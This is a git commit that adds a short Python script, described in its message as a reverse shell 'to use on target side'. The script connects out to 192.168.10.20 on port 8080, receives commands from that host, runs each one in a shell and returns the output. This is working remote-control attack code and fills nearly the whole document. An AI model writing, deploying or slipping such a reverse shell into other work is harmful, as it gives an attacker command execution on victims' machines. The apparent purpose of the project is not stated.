358b6d486bb710dcc6847f9c35106f2a5a97cf0f
DanteArcanaelMontford <dantearcanaelmontford@gmail.com>
2022-09-18 19:18:56 -0500

    feat: add target connection reveser shell to use on target side

---
+++ target_connection_reverse_shell.py
@@ -0,0 +1,20 @@
+import socket
+import subprocess
+
+def connect():
+  s = socket.socket()
+  s.connect(('192.168.10.20', 8080))
+  while True:
+    command = s.recv(1024)
+    if 'terminate' in command:
+      s.close()
+      break
+    else:
+      CMD = subprocess.Popen(command.decode(), shell = True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+      s.send(CMD.stdout.read())
+      s.send(CMD.stderr.read())
+
+def main():
+  connect()
+
+main()
